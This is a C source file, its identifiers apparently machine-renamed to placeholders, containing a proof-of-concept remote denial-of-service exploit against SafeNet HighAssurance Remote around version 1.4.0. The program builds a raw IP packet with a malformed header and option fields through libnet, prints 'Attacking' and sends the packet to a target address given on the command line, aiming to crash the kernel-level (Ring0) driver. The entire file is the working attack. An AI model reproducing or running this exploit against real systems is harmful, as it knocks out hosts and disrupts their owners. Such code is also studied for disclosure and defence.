
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef void* u_int32_t ;
typedef int u_char ;
struct opt {int nxt_hdr; int opt_len; } ;
struct TYPE_4__ {void* s_addr; } ;
struct TYPE_3__ {void* s_addr; } ;
struct ip {int ip_v; TYPE_2__ ip_dst; TYPE_1__ ip_src; scalar_t__ ip_sum; scalar_t__ ip_p; scalar_t__ ip_ttl; void* ip_off; void* ip_id; void* ip_len; scalar_t__ ip_tos; scalar_t__ ip_hl; } ;
typedef int libnet_t ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_0 (int) ;
 int FUNC_1 (int ,char*,char*) ;
 void* FUNC_2 (int) ;
 int * FUNC_3 (int ,char*,char*) ;
 int FUNC_4 (int *,int *,int) ;
 void* FUNC_5 (char*) ;
 int * FUNC_6 (int) ;
 int FUNC_7 (int *,int ,int) ;
 int FUNC_8 (char*) ;
 int FUNC_9 (char*,...) ;
 int VAR_6 ;

int
FUNC_10 (int VAR_7, char **VAR_8)
{
  u_char *VAR_9 = ((void*)0);


  char VAR_10[VAR_3];
  libnet_t *VAR_11;
  char *VAR_12 = ((void*)0);


  struct ip *VAR_13 = ((void*)0);
  struct opt *VAR_14 = ((void*)0);
  u_int32_t VAR_15 = 0, VAR_16 = 0;

  FUNC_9 ("SafeNet HighAssurance Remote ~1.4.0 Ring0 DoS POC\n"
          "by John Anderson <john@ev6.net>\n"
          "   mu-b <mu-b@digit-labs.org>\n\n");

  if (!VAR_8[1])
    {
      FUNC_9 ("Usage: %s <destination> [source]\n", VAR_8[0]);
      FUNC_0 (VAR_0);
    }


  if ((VAR_9 = FUNC_6 (VAR_2 + VAR_5)) == ((void*)0))
    {
      FUNC_8 ("malloc: ");
      FUNC_0 (VAR_0);
    }


  VAR_11 = FUNC_3 (VAR_4, VAR_12, VAR_10);
  if (VAR_11 == ((void*)0))
    {
      FUNC_1 (VAR_6, "libnet_init() failed: %s", VAR_10);
      FUNC_0 (-1);
    }

  if (!VAR_8[2])
    VAR_15 = FUNC_5 ("127.0.0.1");
  else
    VAR_15 = FUNC_5 (VAR_8[2]);

  VAR_16 = FUNC_5 (VAR_8[1]);


  FUNC_7 (VAR_9, 0, sizeof VAR_9);
  VAR_13 = (struct ip *) VAR_9;
  VAR_13->ip_v = 6;
  VAR_13->ip_hl = 0;
  VAR_13->ip_tos = 0;
  VAR_13->ip_len = FUNC_2 (VAR_2 + VAR_5);
  VAR_13->ip_id = FUNC_2 (0);
  VAR_13->ip_off = FUNC_2 (0);
  VAR_13->ip_ttl = 0;
  VAR_13->ip_p = 0;
  VAR_13->ip_sum = 0;
  VAR_13->ip_src.s_addr = VAR_15;
  VAR_13->ip_dst.s_addr = VAR_16;


  VAR_14 = (struct opt *) (VAR_9 + VAR_2);
  VAR_14->nxt_hdr = 0x3C;
  VAR_14->opt_len = 0x07;





  FUNC_9 ("Attacking %s", VAR_8[1]);
  FUNC_4 (VAR_11, VAR_9, VAR_2 + VAR_5);
  FUNC_9 (".\n");

  return (VAR_1);
}
